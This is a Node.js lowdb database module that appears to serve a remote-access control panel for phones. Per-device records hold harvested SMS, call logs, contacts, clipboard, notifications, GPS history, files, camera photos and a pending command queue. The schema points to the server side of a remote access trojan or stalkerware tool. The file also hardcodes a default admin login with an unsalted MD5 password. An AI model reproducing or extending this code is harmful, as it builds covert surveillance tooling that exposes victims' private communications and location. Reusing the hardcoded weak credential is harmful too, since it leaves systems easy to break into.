const fs = require('fs');
const path = require('path');
const low = require('lowdb');
const FileSync = require('lowdb/adapters/FileSync');
const config = require('./config');

// Initialize logging (we can't use logger here as it depends on db)
const logInit = (type, msg) => console.log(`[${new Date().toISOString()}] [${type}] ${msg}`);

// Ensure directories exist
try {
    const dirs = [
        config.dbPath, 
        config.downloadsPath, 
        config.photosPath, 
        path.join(config.dbPath, 'clients')
    ];
    
    dirs.forEach(dir => {
        if (!fs.existsSync(dir)) {
            fs.mkdirSync(dir, { recursive: true });
            logInit('INFO', `Created directory: ${dir}`);
        }
    });
} catch (e) {
    logInit('ERROR', `Failed to create directories: ${e.message}`);
}

// Main database
let main;
try {
    const mainPath = path.join(config.dbPath, 'main.json');
    const mainAdapter = new FileSync(mainPath);
    main = low(mainAdapter);
    
    main.defaults({
        admin: { 
            user: 'admin', 
            pass: '2ceb2612c67290db4f1f42593daf85d7', // MD5 of 'fason'
            token: '' 
        },
        clients: [],
        settings: {
            serverStart: new Date().toISOString(),
            version: '2.1.0'
        }
    }).write();
    
    logInit('INFO', 'Main database initialized');
} catch (e) {
    logInit('ERROR', `Failed to initialize main database: ${e.message}`);
    process.exit(1);
}

// Client database cache
const clientDbs = {};

// Get or create client database
function client(id) {
    if (!id || typeof id !== 'string') {
        logInit('ERROR', 'Invalid client ID');
        return null;
    }
    
    // Return cached db if exists
    if (clientDbs[id]) {
        return clientDbs[id];
    }
    
    try {
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        const adapter = new FileSync(file);
        const db = low(adapter);
        
        db.defaults({
            id,
            queue: [],
            sms: [],
            calls: [],
            contacts: [],
            wifi: [],
            clipboard: [],
            notifications: [],
            permissions: [],
            apps: [],
            gps: [],
            gpsInterval: 0,
            downloads: [],
            files: [],
            currentPath: '',
            cameras: [],
            photos: [],
            lastUpdated: new Date().toISOString()
        }).write();
        
        clientDbs[id] = db;
        return db;
    } catch (e) {
        logInit('ERROR', `Failed to create client database for ${id}: ${e.message}`);
        return null;
    }
}

// Get all client IDs
function getClientIds() {
    try {
        const clientsDir = path.join(config.dbPath, 'clients');
        if (!fs.existsSync(clientsDir)) return [];
        
        return fs.readdirSync(clientsDir)
            .filter(f => f.endsWith('.json'))
            .map(f => f.replace('.json', ''));
    } catch (e) {
        logInit('ERROR', `Failed to get client IDs: ${e.message}`);
        return [];
    }
}

// Delete client data
function deleteClient(id) {
    try {
        // Remove from main database
        main.get('clients').remove({ id }).write();
        
        // Delete client database file
        const file = path.join(config.dbPath, 'clients', `${id}.json`);
        if (fs.existsSync(file)) {
            fs.unlinkSync(file);
        }
        
        // Remove from cache
        delete clientDbs[id];
        
        return true;
    } catch (e) {
        logInit('ERROR', `Failed to delete client ${id}: ${e.message}`);
        return false;
    }
}

// Clear client data (keep client record, clear data)
function clearClientData(id) {
    try {
        const cdb = client(id);
        if (!cdb) return false;
        
        cdb.assign({
            queue: [],
            sms: [],
            calls: [],
            contacts: [],
            wifi: [],
            clipboard: [],
            notifications: [],
            permissions: [],
            apps: [],
            gps: [],
            downloads: [],
            files: [],
            currentPath: '',
            cameras: [],
            photos: []
        }).write();
        
        return true;
    } catch (e) {
        logInit('ERROR', `Failed to clear client data ${id}: ${e.message}`);
        return false;
    }
}

// Get database stats
function getStats() {
    try {
        const clientIds = getClientIds();
        let totalSize = 0;
        
        // Get main db size
        const mainPath = path.join(config.dbPath, 'main.json');
        if (fs.existsSync(mainPath)) {
            totalSize += fs.statSync(mainPath).size;
        }
        
        // Get logs db size
        const logsPath = path.join(config.dbPath, 'logs.json');
        if (fs.existsSync(logsPath)) {
            totalSize += fs.statSync(logsPath).size;
        }
        
        // Get client dbs size
        clientIds.forEach(id => {
            const file = path.join(config.dbPath, 'clients', `${id}.json`);
            if (fs.existsSync(file)) {
                totalSize += fs.statSync(file).size;
            }
        });
        
        return {
            clientCount: clientIds.length,
            totalDbSize: totalSize,
            downloadsPath: config.downloadsPath,
            photosPath: config.photosPath
        };
    } catch (e) {
        return { error: e.message };
    }
}

// Backup database
function backup(backupPath) {
    try {
        const backupDir = backupPath || path.join(config.dbPath, 'backups', new Date().toISOString().replace(/[:.]/g, '-'));
        fs.mkdirSync(backupDir, { recursive: true });
        
        // Copy main db
        const mainPath = path.join(config.dbPath, 'main.json');
        if (fs.existsSync(mainPath)) {
            fs.copyFileSync(mainPath, path.join(backupDir, 'main.json'));
        }
        
        // Copy logs db
        const logsPath = path.join(config.dbPath, 'logs.json');
        if (fs.existsSync(logsPath)) {
            fs.copyFileSync(logsPath, path.join(backupDir, 'logs.json'));
        }
        
        // Copy client dbs
        const clientsDir = path.join(config.dbPath, 'clients');
        const backupClientsDir = path.join(backupDir, 'clients');
        fs.mkdirSync(backupClientsDir, { recursive: true });
        
        if (fs.existsSync(clientsDir)) {
            fs.readdirSync(clientsDir)
                .filter(f => f.endsWith('.json'))
                .forEach(f => {
                    fs.copyFileSync(
                        path.join(clientsDir, f),
                        path.join(backupClientsDir, f)
                    );
                });
        }
        
        return { success: true, path: backupDir };
    } catch (e) {
        return { success: false, error: e.message };
    }
}

module.exports = { 
    main, 
    client, 
    getClientIds, 
    deleteClient, 
    clearClientData, 
    getStats, 
    backup 
};
